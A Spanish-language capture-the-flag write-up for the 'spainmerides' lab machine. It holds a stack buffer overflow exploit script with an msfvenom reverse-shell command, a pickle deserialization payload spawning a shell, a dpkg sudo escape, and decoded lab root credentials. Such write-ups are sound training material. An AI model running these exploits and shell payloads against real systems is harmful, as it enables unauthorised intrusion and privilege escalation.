## Reconocimiento:

Puerto 80 : HTTP

En el escaneo con scripts avanzados de nmap (-sVC) nos revela un dominio:

```bash
http://spainmerides.dl
```

No hay nada interesante, le aplico un fuzzing de directorios:

```bash
gobuster dir -u http://spainmerides.dl/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Interesa el directorio “manager.php”, dentro hay un archivo descargable llamado bitlock. 
Ya descargado:

```bash
chmod +x bitlock
./bitlock
```

Info:

```bash
Esperando conexiones en el puerto 9000...
```

Pruebo que pasa:

```bash
netcat 127.0.0.1 9000
```

Intento un desbordamiento de memoria:

```bash
AAAAAAAAAAAAAAAAAAAAAAA
# Info:
zsh: segmentation fault ./bitlock
```

Se confirma la vulnerabilidad de “Buffer Overflow” y toca hacer ingeniería inversa.

Lo hare con la herramienta pwndgb, toca instalarla:

```bash
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

Luego lo inicio:

```bash
gdb -q ./bitlock
```

Vay a usar la herramienta “pattern_create.rb” de metasploit para crear una cadena de caracteres diseñada para desbordar el buffer:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
```

la cedena sería tal que:

```bash
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

Lo pruebo y sirve, para facilitar el proceso encontré en un writeup de nuestro compañero Dise0, un script en python que automatiza la conexión y vuelve mas sencilla la técnica:

```python
# nano step1.py
#!/usr/bin/python3

import socket

target_ip = "127.0.0.1"
target_port = 9000

test_pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(test_pattern + b"\r\n")

if __name__ == '__main__':
    send_payload()
```

Primero se ejecuta el binario con gdb y luego el script. 

Para el siguiente paso ( identificar el offset )  necesitamos conocer la ubicación de memoria EIP:

```bash
info registers 
# 0x61413761
```

Voy a usar otra herramienta de Metasploit:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x61413761
# Info: [*] Exact match at offset 22
```

Indica que el offs3et es de 22 bytes, sabiendo eso modificamos el script:

```python
#!/usr/bin/python3

import socket

target_ip = "127.0.0.1"
target_port = 9000

buffer_size = 22
padding = b"A" * buffer_size
eip_override = b"B" * 4

crafted_payload = padding + eip_override

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(crafted_payload + b"\r\n")

if __name__ == '__main__':
    send_payload()
```

Y lo mismo, primero el binario en gdb y luego el script.

Funciona, ya que logramos sobrescribir el registro EIP con 0x42424242.

Conociendo la vulnerabilidad toca inyectar una shellcode, primero hay que comprobar que pasa con los datos introducidos después del EIP. Se modifica el script creando una variable llamada “after_eip” y se vería algo así:

```python
#!/usr/bin/python3

import socket

target_ip = "127.0.0.1"
target_port = 9000

buffer_size = 22
padding = b"A" * buffer_size
eip_override = b"B" * 4
post_eip_data = b"C" * 300

crafted_payload = padding + eip_override + post_eip_data

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(crafted_payload + b"\r\n")

if __name__ == '__main__':
    send_payload()
```

Mismo proceso.

Luego toca ver la info del stack y comprobar que vamos bien:

```bash
# en gdb
x/300wx &esp
0xffffce40:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffce50:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffce60:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffce70:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffce80:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffce90:     0x43434343      0x43434343      0x43434343      0x43434343
0xffffcea0:     0x43434343      0x43434343      0x43434343      0x43434343
...
```

Vemos que se esta realizando todo correctamente al principio de la pila y llenando esos huecos con la C que se corresponden con 0x43434343.

El siguiente paso es identificar el código de operación ( opcode ) de un salto ( JMP ESP ). Para eso metasploit back again:

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```

Dentro: 

```bash
jmp esp
# Info:
00000000 FFE4    jmp esp
```

Ahora uso objdump para saber cual es la dirección de memoria la cual nos permite realizar el JMP ESP

```bash
objdump -d bitlock | grep "FF E4" -i
# Info:
804948b:    ff e4   jmp esp
```

La dirección de memoria es: 0x0804948b.

Ahora crear el payload:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -b '\x00\x0a\x0d' -f py
```

Dando una cadena de NOPS. Modificamos el script y nos enviamos la shell:

```python
#!/usr/bin/python3

import socket
from struct import pack

target_ip = "172.17.0.2"
target_port = 9000

buffer_size = 22
padding = b"A" * buffer_size
jmp_esp_address = pack("<L", 0x0804948b)  # Dirección de JMP ESP obtenida con análisis previo.
nop_sled = b'\x90' * 32  # Pista de NOPs para mayor tolerancia.

# Shellcode personalizado para reverse shell
<CONTENIDO_GENERADO>

crafted_payload = padding + jmp_esp_address + nop_sled + buf

def send_payload():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((target_ip, target_port))
        sock.send(crafted_payload + b"\r\n")

if __name__ == '__main__':
    send_payload()
```

Info técnica del script:

**Desbordamiento del buffer**: El payload comienza con `A`'s para llenar el buffer hasta alcanzar el `offset` donde se sobrescribe el `EIP` (`22` en este caso).

**Dirección de retorno**: Utilizamos la dirección de una instrucción `jmp esp` para redirigir la ejecución hacia nuestro `shellcode`. Esta dirección se obtiene mediante análisis del binario vulnerable usando herramientas como `gdb`.

**NOP sled**: Se añade una "`pista`" de `NOPs` (`\x90`) antes del `shellcode` para garantizar que cualquier variación en la dirección de salto no interfiera con la ejecución del `payload`.

Primero:

En gdb: run

En el host a la escucha

y luego ejecutar el script

## Escalada www-data → maci

```bash
sudo -l
(maci) NOPASSWD: /bin/python3 /home/maci/.time_seri/time.py
```

Vemos que hay un archivo de configuración el cual permite o no la deserialización por lo que nos iremos aquí:

```bash
cd /home/maci/.time_seri
```

Tiene permisos de escritura, así que cambio “serial=off por serial=on”

Ahora ejecuto el script:

```bash
sudo -u maci python3 /home/maci/.time_seri/time.py
# Info:
Datos deserializados correctamente, puedes revisar /tmp
```

```bash
cat /tmp/.data2.log
```

Por lo que vemos esta ejecutando el data.pk1 serializado, por lo que nosotros podremos serializar un /bin/bash para obtener la shell del usuario maci.

```python

import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('/bin/bash',))

# Ruta al archivo que deseas sobrescribir
file_path = '/opt/data.pk1'

# Verificar si el archivo es escribible
if os.access(file_path, os.W_OK):
    with open(file_path, 'wb') as f:
        # Generar el payload y sobrescribir el archivo
        pickle.dump(Exploit(), f)
    print(f"El archivo {file_path} ha sido sobrescrito con el payload.")
else:
    print(f"No tienes permisos para sobrescribir el archivo {file_path}.")
```

Luego de ejecutarlo:

```bash
sudo -u maci python3 /home/maci/.time_seri/time.py
```

## Escalada maci → darksblack

```bash
sudo -l
(darksblack) NOPASSWD: /usr/bin/dpkg
```

Se ejecuta el binario gracias GTFO bins por tanto, perdón por tan poco.

```bash
sudo -u darksblack dpkg -l
!bash
```

## Escalada darksblack → root

Aquí no supe que hacer, tuve que consultar el writeup del creador (darksblack)

Entiendo que el problema esta en que el PATH esta corrompido, y si lo intentamos exportar sale esto:

```bash
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
# Info:
no tan rapido campeon!
```

Toca usar rutas absolutas, se lista el /home de darksblack:

```bash
/bin/ls -la
```

Hay un archivo llamado Olympus

Nos pasamos este archivo:

```bash
cd .zprofile/
```

Desde el servidor abrimos uno con python y nos lo traemos al host con wget:

```bash
/bin/python3 -m http.server
# En el host
wget http://172.17.0.2:8000/OlympusValidator
```

Le hago ingeniería inversa con Ghidra

En la función “spoof” hay algo interesante:

```bash
/* WARNING: Function: __x86.get_pc_thunk.ax replaced with injection: get_pc_thunk_ax */

void spoof(void)

{
  printf("%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n",0x43,0x72,
         0x65,100,0x65,0x6e,99,0x69,0x61,0x6c,0x65,0x73,0x20,0x73,0x73,0x68,0x20,0x72,0x6f,0x6f,0x74
         ,0x3a,0x40,0x23,0x2a,0x29,0x32,0x37,0x37,0x32,0x38,0x30,0x29,0x36,0x78,0x34,0x6e,0x30);
  return;
}
```

Eso se mostraría si el input del SERIAL al binario Olympus fuera correcto, y parece que esta codificado.

Ya decodificado:

```bash
- `0x43` → `C`
- `0x72` → `r`
- `0x65` → `e`
- `100` → `d`
- `0x65` → `e`
- `0x6e` → `n`
- `99` → `c`
- `0x69` → `i`
- `0x61` → `a`
- `0x6c` → `l`
- `0x65` → `e`
- `0x73` → `s`
- `0x20` → espacio
- `0x73` → `s`
- `0x73` → `s`
- `0x68` → `h`
- `0x20` → espacio
- `0x72` → `r`
- `0x6f` → `o`
- `0x6f` → `o`
- `0x74` → `t`
- `0x3a` → `:`
- `0x40` → `@`
- `0x23` → `#`
- `0x2a` → `*`
- `0x29` → `)`
- `0x32` → `2`
- `0x37` → `7`
- `0x37` → `7`
- `0x32` → `2`
- `0x38` → `8`
- `0x30` → `0`
- `0x29` → `)`
- `0x36` → `6`
- `0x78` → `x`
- `0x34` → `4`
- `0x6e` → `n`
- `0x30` → `0`
```

Revelando las credenciales de root:

```
Credenciales ssh root:@#*)277280)6x4n0

ssh root@<IP>
```

Y listo.
